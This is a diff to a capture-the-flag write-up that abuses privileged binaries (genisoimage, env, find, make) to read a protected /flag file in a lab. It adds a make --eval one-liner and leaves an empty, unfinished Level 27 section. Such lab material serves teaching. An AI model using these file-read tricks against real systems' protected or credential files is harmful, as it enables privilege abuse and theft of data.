@@ -237,13 +237,19 @@ $ ar -r flag.a /flag && strings flag.a | grep pwn
 $ find /flag | cpio -o
 ```
 
-### Level 24 - genisoimage
+<center>
+    <h1>
+      	Execute other commands to read flag
+    </h1> 
+</center>
+
+### Level 23 - genisoimage
 
 ```bash
 $ genisoimage -sort /flag | grep pwn
 ```
 
-### Level 25 - env
+### Level 24 - env
 
 From the `man` page of `env`:
 
@@ -256,11 +262,28 @@ We will use `env` to execute `head` and check the content of /`flag`.
 $ env head /flag 
 ```
 
-### Level 26 - find
+### Level 25 - find
 
 There is a variety of ways for this, from spawning shell, use `head`, `more` or whatever we learned from the first challenges to print the content of `/flag`.
 
 ```bash
 $ find /flag -exec /usr/bin/cat /flag \;
 ```
+
+### Level 26 - make
+
+With a bit of bash magic, we can come up with something like this:
+
+```bash
+$ make -s -C / -f /dev/null --eval="$(echo -e 'print_flag:\n\t@cat /flag\n') print_flag"
+```
+
+### Level 27 - nice
+
+```bash
+```
+
+
+
+
 
